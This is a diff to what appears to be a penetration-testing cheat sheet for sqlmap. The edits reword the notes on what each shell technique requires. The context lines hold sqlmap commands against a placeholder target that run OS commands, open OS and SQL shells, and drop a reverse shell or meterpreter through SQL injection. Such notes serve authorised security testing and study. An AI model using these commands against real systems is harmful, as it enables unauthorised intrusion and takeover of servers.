@@ -44,11 +44,11 @@
 
 ## Shell
 
-Execute a command (requires permission):
+Execute a command (requires permissions):
 
     # sqlmap -u "<target>/<pagename>.php?id=1" --os-cmd whoami
 
-Simple shell (will not work when not having the permissions:
+Simple shell (requires permissions or a file inclusion vulnerability in any of the applications on the webserver):
 
     # sqlmap -u "<target>/<pagename>.php?id=1" --os-shell
 
@@ -56,7 +56,7 @@ SQL shell:
 
     # sqlmap -u "<target>/<pagename>.php?id=1" --sql-shell
 
-Dropping a reverse-shell/meterpreter (requires permissions):
+Dropping a reverse-shell/meterpreter (requires permissions or a file inclusion vulnerability in any of the applications on the webserver):
 
     # sqlmap -u "<target>/<pagename>.php?id=1" --os-pwn
 
